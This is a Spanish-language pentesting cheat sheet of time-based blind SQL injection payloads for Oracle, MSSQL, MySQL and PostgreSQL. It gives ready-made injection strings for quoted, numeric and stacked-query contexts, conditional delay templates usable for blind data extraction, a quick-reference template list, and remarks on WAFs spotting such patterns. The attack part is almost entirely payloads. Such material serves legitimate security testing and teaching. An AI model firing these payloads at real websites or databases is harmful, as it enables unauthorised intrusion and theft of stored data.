
---
# Cheat‑sheet: Time‑based blind SQLi — Oracle, MSSQL, MySQL y PostgreSQL

En este documento explicamos de forma pedagógica y ordenada las **variantes más usadas** para pruebas _time‑based blind SQL injection_ en los motores de bases de datos más comunes: **Oracle**, **Microsoft SQL Server (MSSQL)**, **MySQL** y **PostgreSQL**. Iremos de menos a más: primero la idea general, luego payloads de ejemplo adaptados a distintos contextos (cadena entre comillas, contexto numérico, imposibilidad de usar `;`, etc.), y por último notas sobre permisos y recomendaciones éticas.


---

## Idea general

En una inyección _time‑based blind_ buscamos provocar una **detención (sleep / delay)** en la ejecución de la consulta cuando se cumple una condición. Midiendo la demora de la respuesta detectamos si la condición es verdadera aunque no veamos la salida directa.

Las llamadas concretas para pausar la ejecución dependen del SGBD:

- Oracle: `DBMS_LOCK.SLEEP(<segundos>)` o `DBMS_PIPE.RECEIVE_MESSAGE('a', <segundos>)` (alternativa útil cuando no podemos ejecutar PL/SQL).
    
- MSSQL: `WAITFOR DELAY 'hh:mm:ss'`.
    
- MySQL: `SLEEP(<segundos>)`.
    
- PostgreSQL: `pg_sleep(<segundos>)`.
    

Además, debemos adaptar la **inserción** al contexto del parámetro vulnerable (cadena entre comillas, numérico, clausulas booleanas, posibilidad de terminar la instrucción con `;`, etc.). También tener en cuenta la sintaxis de comentarios del RDBMS (`--` , `#`, `/* ... */`).


---

## MySQL — ejemplos y variantes

### Forma habitual

- `SLEEP(10)` — devuelve `0` tras dormir la cantidad de segundos indicada.
    

### Contexto: dentro de comillas (cadena)

Plantilla típica cuando el parámetro está entre comillas:

```sql
' AND (SELECT SLEEP(10))-- -
```

o simplemente:

```sql
' OR (SELECT SLEEP(10))-- -
```

**Nota sobre comentarios en MySQL:** el estilo `--` requiere un espacio después de los guiones (`--` ). También podemos usar `#` para comentar hasta el fin de línea.

### Contexto: numérico

```sql
1 AND (SELECT SLEEP(10))
```

o, cuando no podemos introducir subselects fácilmente:

```sql
1 OR SLEEP(10) -- (solo en algunos contextos donde la función puede evaluarse directamente)
```

### Ejemplo práctico

Si tenemos un parámetro `q` dentro de una consulta como:

```sql
SELECT * FROM products WHERE name = '<INPUT>';
```

una payload para comprobar time‑based podría ser:

```
' AND (SELECT SLEEP(10))-- -
```

---

## PostgreSQL — ejemplos y variantes

### Forma habitual

- `pg_sleep(10)` — pausa en segundos.
    

### Contexto: dentro de comillas (cadena)

En PostgreSQL a menudo veremos concatenaciones con `||`. Una inyección típica cuando el parámetro se concatena a una cadena sería:

```sql
' || (SELECT pg_sleep(10)) || ' --
```

```SQL
'|| pg_sleep(10)-- -
```

O cerrando la comilla y ejecutando la llamada:

```sql
'; SELECT pg_sleep(10); --
```

### Contexto: numérico / booleano

```sql
1 OR (SELECT pg_sleep(10))--
```

### Notas

- `pg_sleep` es estándar y no suele requerir privilegios elevados.
    
- Comentar en PostgreSQL se hace con `--` o `/* ... */`.
    
---

## Oracle — ejemplos y variantes

### Formas que solemos ver

- `DBMS_LOCK.SLEEP(10)` — sleep directo, suele necesitar permisos PL/SQL.
    
- `DBMS_PIPE.RECEIVE_MESSAGE('a',10)` — alternativa que bloquea hasta el timeout; frecuentemente útil cuando no podemos ejecutar bloques PL/SQL.
    

### Contexto: parámetro dentro de comillas simples (cadena)

Si la aplicación concatena el parámetro dentro de una cadena `'...<INPUT>...'`, podríamos inyectar cerrando la comilla, añadiendo una expresión y comentando el resto. Ejemplo (plantilla):

```sql
' OR 1=(SELECT CASE WHEN (<condición>) THEN dbms_pipe.receive_message('a',10) ELSE 0 END FROM dual) -- 
```

O, si podemos usar bloques PL/SQL:

```sql
'; BEGIN IF (<condición>) THEN DBMS_LOCK.SLEEP(10); END IF; END; --
```

### Contexto: numérico o dentro de expresión (sin comillas)

```sql
1 OR 1=(SELECT dbms_pipe.receive_message('a',10) FROM dual) --
```

### Notas sobre permisos

- `DBMS_LOCK.SLEEP` puede requerir privilegios especiales.
    
- `DBMS_PIPE.RECEIVE_MESSAGE` suele funcionar en más escenarios y por eso es muy usado en PoC.
    

---

## Microsoft SQL Server (MSSQL) — ejemplos y variantes

### Forma habitual

- `WAITFOR DELAY '00:00:10'` — formato `hh:mm:ss`.
    

### Contexto: dentro de comillas

```sql
' ; WAITFOR DELAY '00:00:10' --
```

O usando `IF` cuando estamos dentro de una clausula:

```sql
' ; IF (<condición>) WAITFOR DELAY '00:00:10' --
```

### Contexto: como parte de una expresión booleana (sin `;` disponible)

Podemos depender de que el motor permita `BEGIN...END` o sub‑consultas; ejemplo común en pruebas (plantilla):

```sql
' OR (SELECT CASE WHEN (<condición>) THEN 1/0 ELSE 1 END) = 1 --
```

Aunque este último es ejemplo de error‑based; para time‑based el uso típico sigue siendo `WAITFOR DELAY` cuando podemos ejecutar instrucciones separadas.

### Notas

- `WAITFOR` es la forma estándar.
    
- En algunos contextos transaccionales su uso puede comportarse distinto (bloqueos, timeouts), por lo que conviene ajustar los tiempos.
    


---

## Plantillas rápidas resumidas

- Oracle (PL/SQL posible):
    
```SQL
; BEGIN DBMS_LOCK.SLEEP(10); END; --
```

```SQL
' OR 1=(SELECT dbms_pipe.receive_message('a',10) FROM dual) --
```

- MSSQL:

```SQL
'; WAITFOR DELAY '00:00:10' --
```

```SQL
; IF (<condición>) WAITFOR DELAY '00:00:10' --
```

- MySQL:

```SQL
' AND (SELECT SLEEP(10))-- -
```

```SQL
1 AND (SELECT SLEEP(10))
```

- PostgreSQL:

```SQL
'; SELECT pg_sleep(10); --
```

```SQL
'|| (SELECT pg_sleep(10)) --
```


---

## Consideraciones prácticas y limitaciones

1. **Contexto de inyección:** el payload debe adaptarse al contexto exacto (tipo de parámetro, si hay comillas, si se permite `;`, etc.).
    
2. **Permisos y funciones habilitadas:** algunas funciones requieren privilegios o pueden estar deshabilitadas. En Oracle hay diferencias entre `DBMS_LOCK.SLEEP` y `DBMS_PIPE.RECEIVE_MESSAGE`.
    
3. **WAF y detección:** muchos WAF detectan patrones comunes (`SLEEP`, `pg_sleep`, `WAITFOR`, etc.). Si el objetivo tiene protección es posible que los intentos sean bloqueados.
    
4. **Medición de tiempos:** al medir retardos pequeños en redes con latencia variable, conviene usar duraciones razonables (p. ej. 5–10 s) y repetir para confirmar.
    

---


